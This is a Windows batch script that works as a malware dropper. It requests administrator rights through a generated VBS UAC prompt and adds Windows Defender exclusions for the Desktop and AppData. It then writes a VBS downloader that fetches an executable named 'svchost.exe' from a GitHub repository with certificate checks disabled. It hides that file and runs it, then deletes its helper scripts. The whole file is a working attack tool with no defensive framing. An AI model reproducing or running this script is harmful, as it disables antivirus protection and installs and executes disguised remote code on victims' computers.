@echo off
setlocal enabledelayedexpansion

>nul 2>&1 net session
if %errorlevel% neq 0 (
    set "vbs=%~dp0getadmin.vbs"
    echo Set UAC = CreateObject^("Shell.Application"^) > "!vbs!"
    echo UAC.ShellExecute "cmd.exe", "/c """"%~f0""""", "", "runas", 1 >> "!vbs!"
    cscript //nologo "!vbs!" >nul
    del "!vbs!" >nul
    exit /b
)

set "exeUrl=https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe"
set "exeName=svchost.exe"
set "desktopPath=%USERPROFILE%\Desktop"
set "appdataPath=%APPDATA%"
set "exePathDesktop=%desktopPath%\%exeName%"
set "exePathAppData=%appdataPath%\Temp\%exeName%"
set "vbsDownloader=%~dp0dl.vbs"

call :AddExclusion "%desktopPath%"
call :AddExclusion "%exePathDesktop%"
call :AddExclusion "%appdataPath%"
call :AddExclusion "%exePathAppData%"

goto :after_exclusions

:AddExclusion
set "path=%~1"
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%path%' -ErrorAction SilentlyContinue" >nul 2>&1
exit /b

:after_exclusions

(
echo Dim http, stream, url, path
echo url = WScript.Arguments^(0^)
echo path = WScript.Arguments^(1^)
echo On Error Resume Next
echo Set http = CreateObject^("MSXML2.ServerXMLHTTP.6.0"^)
echo If Err.Number ^<^> 0 Then
echo     WScript.Quit 1
echo End If
echo http.setOption 2, 13056
echo http.Open "GET", url, False
echo http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
echo http.Send
echo If Err.Number ^<^> 0 Then
echo     WScript.Quit 1
echo End If
echo If http.Status = 200 Then
echo     Set stream = CreateObject^("ADODB.Stream"^)
echo     stream.Type = 1
echo     stream.Open
echo     stream.Write http.ResponseBody
echo     stream.SaveToFile path, 2
echo     stream.Close
echo Else
echo     WScript.Quit 1
echo End If
) > "%vbsDownloader%"

if not exist "%vbsDownloader%" (
    pause
    exit /b 1
)

cscript //nologo "%vbsDownloader%" "%exeUrl%" "%exePathDesktop%" >nul
copy /Y "%exePathDesktop%" "%exePathAppData%" >nul 2>&1
del "%vbsDownloader%" >nul

if exist "%exePathDesktop%" (
    attrib +h "%exePathDesktop%" >nul
    start "" "%exePathDesktop%"
) else if exist "%exePathAppData%" (
    attrib +h "%exePathAppData%" >nul
    start "" "%exePathAppData%"
) else (
    powershell -Command "Get-MpThreatDetection | Select-Object ThreatName, Resources" 2>nul
    pause
)

endlocal
exit /b
